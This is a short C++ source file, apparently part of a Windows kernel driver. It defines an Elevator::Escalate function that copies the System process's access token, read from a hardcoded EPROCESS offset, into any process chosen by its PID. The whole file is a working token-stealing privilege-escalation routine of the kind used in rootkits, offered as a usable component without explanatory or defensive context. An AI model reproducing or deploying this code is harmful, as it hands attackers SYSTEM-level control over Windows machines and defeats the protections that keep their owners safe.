#include "Header.h"
#include "Elevator.h"
#include "Util.h"

NTSTATUS Elevator::Escalate(int pid) {
    PEPROCESS myproc, sysproc;

    NTSTATUS res = PsLookupProcessByProcessId((HANDLE)pid, &myproc);
    if (!NT_SUCCESS(res)) { Util::handleError(res, "Escalate, Status code: "); return res; }
    res = PsLookupProcessByProcessId((HANDLE)4, &sysproc);
    if (!NT_SUCCESS(res)) { Util::handleError(res, "Escalate, Status code: "); return res; }

    PTRLEN sysToken = *(PTRLEN*)((PTRLEN)sysproc + 0x4b8);
    sysToken &= 0xfffffffffffffff0;
    *(PTRLEN*)((PTRLEN)myproc + 0x4b8) = (PTRLEN)sysToken;

    ObDereferenceObject(myproc);
    ObDereferenceObject(sysproc);
    return STATUS_SUCCESS;
}
